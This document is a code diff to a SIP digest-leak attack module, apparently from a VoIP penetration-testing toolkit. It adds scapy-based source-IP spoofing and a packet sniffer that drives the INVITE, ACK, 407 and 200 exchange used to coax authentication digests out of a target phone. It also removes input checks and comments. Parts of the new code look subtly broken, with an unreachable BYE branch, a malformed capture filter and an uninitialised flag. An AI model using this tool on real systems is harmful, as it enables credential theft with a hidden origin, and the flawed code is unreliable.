@@ -14,6 +14,8 @@ import sys
 import ssl
 import time
 import signal
+import threading
+from scapy.all import IP, UDP, Raw, send, sniff
 from .lib.functions import (
     create_message,
     create_response_error,
@@ -61,6 +63,9 @@ class SipDigestLeak:
         self.file = "iplist.txt"
         self.ppi = ""
         self.pai = ""
+        self.spoof_ip = ""
+        self.use_scapy = False
+        self.stop_sniffing = False
 
         self.quit = False
         self.found = []
@@ -101,61 +106,12 @@ class SipDigestLeak:
         else:
             self.ping = "False"
 
-        # check protocol
-        if self.proto not in supported_protos:
-            print(f"{self.c.BRED}Protocol {self.proto} is not supported")
-            print(self.c.WHITE)
-            sys.exit()
-
-        # if rport is by default but we want to scan TLS protocol, use port 5061
-        if self.rport == 5060 and self.proto == "TLS":
-            self.rport = 5061
-
-        logo = Logo("sipdigestleak")
-        logo.print()
-
-        # signal.signal(signal.SIGINT, self.signal_handler)
-        # print(f"{self.c.BYELLOW}\nPress Ctrl+C to stop")
-        # print(self.c.WHITE)
-
-        if (
-            self.domain != ""
-            and self.domain != str(self.ip)
-            and self.domain != self.host
-        ):
-            print(f"{self.c.BWHITE}[✓] Customized Domain: {self.c.GREEN}{self.domain}")
-        if self.contact_domain != "":
-            print(
-                f"{self.c.BWHITE}[✓] Customized Contact Domain: {self.c.GREEN}{self.contact_domain}"
-            )
-        if self.from_name != "":
-            print(
-                f"{self.c.BWHITE}[✓] Customized From Name: {self.c.GREEN}{self.from_name}"
-            )
-        if self.from_user != "100":
-            print(
-                f"{self.c.BWHITE}[✓] Customized From User: {self.c.GREEN}{self.from_user}"
-            )
-        if self.from_domain != "":
-            print(
-                f"{self.c.BWHITE}[✓] Customized From Domain: {self.c.GREEN}{self.from_domain}"
-            )
-        if self.to_name != "":
-            print(
-                f"{self.c.BWHITE}[✓] Customized To Name: {self.c.GREEN}{self.to_name}"
-            )
-        if self.to_user != "100":
-            print(
-                f"{self.c.BWHITE}[✓] Customized To User: {self.c.GREEN}{self.to_user}"
-            )
-        if self.to_domain != "":
-            print(
-                f"{self.c.BWHITE}[✓] Customized To Domain: {self.c.GREEN}{self.to_domain}"
-            )
-        if self.user_agent != "pplsip":
-            print(
-                f"{self.c.BWHITE}[✓] Customized User-Agent: {self.c.GREEN}{self.user_agent}"
-            )
+        if self.spoof_ip and self.spoof_ip != "":
+            self.use_scapy = True
+            print(f"{self.c.BWHITE}[✓] Using IP spoofing: {self.c.GREEN}{self.spoof_ip}")
+            if self.proto != "UDP":
+                print(f"{self.c.BRED}IP spoofing only works with UDP protocol. Switching to UDP.")
+                self.proto = "UDP"
 
         if self.file == "":
             ips = []
@@ -250,7 +206,6 @@ class SipDigestLeak:
         rr = ""
         digest = ""
 
-        # my IP address
         local_ip = self.localip
         if self.localip == "":
             try:
@@ -264,7 +219,6 @@ class SipDigestLeak:
                 print(self.c.WHITE)
                 exit()
 
-        # SIP headers
         if self.host != "" and self.domain == "":
             self.domain = self.host
         if self.domain == "":
@@ -356,26 +310,27 @@ class SipDigestLeak:
         try:
             sock.settimeout(30)
 
-            # send INVITE
-            if proto == "TCP":
-                sock.connect(host)
-
-            if self.proto == "TLS":
-                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                context.load_default_certs()
-
-                sock_ssl = context.wrap_socket(sock, server_hostname=str(host[0]))
-                sock_ssl.connect(host)
-                sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
+            if self.use_scapy:
+                self.send_with_scapy(msg, host, lport)
             else:
-                sock.sendto(bytes(msg[:8192], "utf-8"), host)
+                if proto == "TCP":
+                    sock.connect(host)
+
+                if self.proto == "TLS":
+                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                    context.check_hostname = False
+                    context.verify_mode = ssl.CERT_NONE
+                    context.load_default_certs()
+
+                    sock_ssl = context.wrap_socket(sock, server_hostname=str(host[0]))
+                    sock_ssl.connect(host)
+                    sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
+                else:
+                    sock.sendto(bytes(msg[:8192], "utf-8"), host)
 
             rescode = "100"
 
             while rescode[:1] == "1":
-                # receive temporary code
                 if self.proto == "TLS":
                     resp = sock_ssl.recv(4096)
                 else:
@@ -410,7 +365,6 @@ class SipDigestLeak:
                     or headers["response_code"] == "407"
                 )
             ):
-                # send ACK
                 print(f"{self.c.YELLOW}[=>] Request ACK")
                 msg = create_message(
                     "ACK",
@@ -548,9 +502,7 @@ class SipDigestLeak:
                         rescode = "100"
                         count = 0
 
-                        # while rescode[:1] == '1':
                         while rescode != "200" and count < 10:
-                            # receive temporary code
                             if self.proto == "TLS":
                                 resp = sock_ssl.recv(4096)
                             else:
@@ -582,7 +534,6 @@ class SipDigestLeak:
                                 if rescode[:1] != "1":
                                     totag = headers["totag"]
 
-                                    # send ACK
                                     print(f"{self.c.YELLOW}[=>] Request ACK")
 
                                     msg = create_message(
@@ -630,7 +581,6 @@ class SipDigestLeak:
                     except:
                         print(self.c.WHITE)
 
-            # receive 200 Ok - call answered
             if headers["response_code"] == "200":
                 try:
                     cuser = headers.get("contactuser", "")
@@ -645,7 +595,6 @@ class SipDigestLeak:
 
                 totag = headers["totag"]
 
-                # send ACK
                 print(f"{self.c.YELLOW}[=>] Request ACK")
 
                 msg = create_message(
@@ -690,13 +639,11 @@ class SipDigestLeak:
                 else:
                     sock.sendto(bytes(msg[:8192], "utf-8"), host)
 
-                # wait for BYE
                 start = time.time()
                 bye = False
                 while bye == False:
                     now = time.time()
 
-                    # Wait 30 sec max
                     if now - start > 30:
                         break
 
@@ -723,7 +670,6 @@ class SipDigestLeak:
                         )
                         print(f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}")
 
-                # send 407 with digest
                 cseq = int(cseq)
                 msg = create_response_error(
                     "407 Proxy Authentication Required",
@@ -756,7 +702,6 @@ class SipDigestLeak:
                 else:
                     sock.sendto(bytes(msg[:8192], "utf-8"), host)
 
-                # receive auth BYE
                 if self.proto == "TLS":
                     resp = sock_ssl.recv(4096)
                 else:
@@ -778,7 +723,6 @@ class SipDigestLeak:
                 except:
                     auth = ""
 
-                # send 200 OK
                 msg = create_response_ok(
                     self.from_user,
                     self.to_user,
@@ -926,3 +870,287 @@ class SipDigestLeak:
         print(self.c.WHITE)
 
         self.found.clear()
+
+    def send_with_scapy(self, msg, host, lport):
+        target_ip = host[0]
+        target_port = host[1]
+        source_ip = self.spoof_ip if self.spoof_ip else self.localip
+        
+        self.stop_sniffing = False
+        sniff_thread = threading.Thread(target=self.sniffer, args=(target_ip, lport))
+        sniff_thread.daemon = True
+        sniff_thread.start()
+        
+        packet = IP(src=source_ip, dst=target_ip) / \
+                UDP(sport=lport, dport=target_port) / \
+                Raw(load=msg)
+        
+        send(packet, verbose=0)
+        
+        if self.verbose == 1:
+            print(
+                f"{self.c.BWHITE}[+] Sending to {target_ip}:{target_port}/UDP with spoofed IP {source_ip} ..."
+            )
+            print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
+        else:
+            print(f"{self.c.BYELLOW}[=>] Request INVITE")
+        
+        timeout = 30
+        while timeout > 0 and not self.stop_sniffing:
+            time.sleep(1)
+            timeout -= 1
+            
+        self.stop_sniffing = True
+        time.sleep(1)
+    
+    def packet_callback(self, pkt):
+        if pkt.haslayer(UDP) and pkt.haslayer(Raw):
+            if pkt[IP].src == self.ip and (pkt[UDP].sport == int(self.rport) or pkt[UDP].sport == 5060):
+                try:
+                    response = pkt[Raw].load.decode('utf-8', errors='ignore')
+                    headers = parse_message(response)
+                    
+                    if headers:
+                        response_text = "%s %s" % (
+                            headers["response_code"],
+                            headers["response_text"],
+                        )
+                        
+                        if self.verbose == 1:
+                            print(
+                                f"{self.c.BWHITE}[-] Receiving from {self.ip}:{self.rport}/UDP ..."
+                            )
+                            print(f"{self.c.GREEN}{response}{self.c.WHITE}")
+                        else:
+                            print(f"{self.c.BGREEN}[<=] Response {response_text}")
+                        
+                        if self.ofile != "":
+                            with open(self.ofile, "a") as fw:
+                                fw.write(
+                                    "[-] Receiving from %s:%s/UDP ...\n"
+                                    % (self.ip, self.rport)
+                                )
+                                fw.write(response + "\n")
+                        
+                        if headers["response_code"] == "100":
+                            pass
+                        elif headers["response_code"] in ["401", "407"]:
+                            if headers["auth"] != "":
+                                auth = headers["auth"]
+                                auth_type = headers["auth-type"]
+                                headers = parse_digest(auth)
+                                realm = headers["realm"]
+                                nonce = headers["nonce"]
+                                uri = "sip:%s@%s" % (self.to_user, self.domain)
+                                algorithm = headers["algorithm"]
+                                cnonce = headers["cnonce"]
+                                nc = headers["nc"]
+                                qop = headers["qop"]
+
+                                if qop != "" and cnonce == "":
+                                    cnonce = generate_random_string(8, 8, "ascii")
+                                if qop != "" and nc == "":
+                                    nc = "00000001"
+
+                                response = calculateHash(
+                                    self.user,
+                                    realm,
+                                    self.pwd,
+                                    "INVITE",
+                                    uri,
+                                    nonce,
+                                    algorithm,
+                                    cnonce,
+                                    nc,
+                                    qop,
+                                    0,
+                                    "",
+                                )
+
+                                digest = (
+                                    'Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s", algorithm=%s'
+                                    % (self.user, realm, nonce, uri, response, algorithm)
+                                )
+                                if qop != "":
+                                    digest += ", qop=%s" % qop
+                                if cnonce != "":
+                                    digest += ', cnonce="%s"' % cnonce
+                                if nc != "":
+                                    digest += ", nc=%s" % nc
+
+                                branch = generate_random_string(71, 71, "ascii")
+                                cseq = str(int(self.cseq) + 1)
+                                
+                                msg = create_message(
+                                    "INVITE",
+                                    self.localip,
+                                    self.contact_domain,
+                                    self.from_user,
+                                    self.from_name,
+                                    self.from_domain,
+                                    self.to_user,
+                                    self.to_name,
+                                    self.to_domain,
+                                    self.proto,
+                                    self.domain,
+                                    self.user_agent,
+                                    self.lport,
+                                    branch,
+                                    self.callid,
+                                    self.from_tag,
+                                    cseq,
+                                    "",
+                                    digest,
+                                    auth_type,
+                                    "",
+                                    self.sdp,
+                                    "",
+                                    self.route,
+                                    self.ppi,
+                                    self.pai,
+                                    "",
+                                    1,
+                                )
+                                
+                                packet = IP(src=self.spoof_ip, dst=self.ip) / \
+                                        UDP(sport=self.lport, dport=int(self.rport)) / \
+                                        Raw(load=msg)
+                                send(packet, verbose=0)
+                                
+                                if self.verbose == 1:
+                                    print(
+                                        f"{self.c.BWHITE}[+] Sending authenticated INVITE to {self.ip}:{self.rport}/UDP ..."
+                                    )
+                                    print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
+                                else:
+                                    print(f"{self.c.BYELLOW}[=>] Request INVITE (AUTH)")
+                        
+                        elif headers["response_code"] == "200":
+                            totag = headers["totag"]
+                            via = headers["via"]
+                            rr = headers["rr"]
+                            
+                            msg = create_message(
+                                "ACK",
+                                self.localip,
+                                self.contact_domain,
+                                self.from_user,
+                                self.from_name,
+                                self.from_domain,
+                                self.to_user,
+                                self.to_name,
+                                self.to_domain,
+                                self.proto,
+                                self.domain,
+                                self.user_agent,
+                                self.lport,
+                                self.branch,
+                                self.callid,
+                                self.from_tag,
+                                self.cseq,
+                                totag,
+                                "",
+                                1,
+                                "",
+                                0,
+                                via,
+                                rr,
+                                "",
+                                "",
+                                "",
+                                1,
+                            )
+                            
+                            packet = IP(src=self.spoof_ip, dst=self.ip) / \
+                                    UDP(sport=self.lport, dport=int(self.rport)) / \
+                                    Raw(load=msg)
+                            send(packet, verbose=0)
+                            
+                            if self.verbose == 1:
+                                print(
+                                    f"{self.c.BWHITE}[+] Sending ACK to {self.ip}:{self.rport}/UDP ..."
+                                )
+                                print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
+                            else:
+                                print(f"{self.c.BYELLOW}[=>] Request ACK")
+                        
+                        elif response.startswith("BYE"):
+                            branch = headers["branch"]
+                            cseq = headers["cseq"]
+                            via = headers["via2"]
+                            
+                            msg = create_response_error(
+                                "407 Proxy Authentication Required",
+                                self.from_user,
+                                self.to_user,
+                                self.proto,
+                                self.domain,
+                                self.lport,
+                                cseq,
+                                "BYE",
+                                branch,
+                                self.callid,
+                                self.from_tag,
+                                headers["totag"],
+                                self.localip,
+                                via,
+                                self.auth_mode,
+                            )
+                            
+                            packet = IP(src=self.spoof_ip, dst=self.ip) / \
+                                    UDP(sport=self.lport, dport=int(self.rport)) / \
+                                    Raw(load=msg)
+                            send(packet, verbose=0)
+                            
+                            if self.verbose == 1:
+                                print(
+                                    f"{self.c.BWHITE}[+] Sending 407 to {self.ip}:{self.rport}/UDP ..."
+                                )
+                                print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
+                            else:
+                                print(f"{self.c.BYELLOW}[=>] Request 407 Proxy Authentication Required")
+                            
+                            self.waiting_for_auth_bye = True
+                        
+                        elif self.waiting_for_auth_bye and response.startswith("BYE"):
+                            branch = headers["branch"]
+                            
+                            msg = create_response_ok(
+                                self.from_user,
+                                self.to_user,
+                                self.proto,
+                                self.domain,
+                                self.lport,
+                                headers["cseq"],
+                                branch,
+                                self.callid,
+                                self.from_tag,
+                                headers["totag"],
+                            )
+                            
+                            packet = IP(src=self.spoof_ip, dst=self.ip) / \
+                                    UDP(sport=self.lport, dport=int(self.rport)) / \
+                                    Raw(load=msg)
+                            send(packet, verbose=0)
+                            
+                            if self.verbose == 1:
+                                print(
+                                    f"{self.c.BWHITE}[+] Sending 200 OK to {self.ip}:{self.rport}/UDP ..."
+                                )
+                                print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
+                            else:
+                                print(f"{self.c.BYELLOW}[=>] Request 200 OK")
+                            
+                            self.stop_sniffing = True
+                        
+                except Exception as e:
+                    print(f"{self.c.RED}[!] Error processing packet: {str(e)}{self.c.WHITE}")
+                    pass
+    
+    def sniffer(self, target_ip, lport):
+        filter_str = f"udp and src host {target_ip} and dst port {lport} or 5060"
+        try:
+            sniff(filter=filter_str, prn=self.packet_callback, store=0, 
+                  stop_filter=lambda x: self.stop_sniffing, timeout=30)
+        except Exception as e:
+            print(f"{self.c.RED}[!] Sniffing error: {str(e)}{self.c.WHITE}")
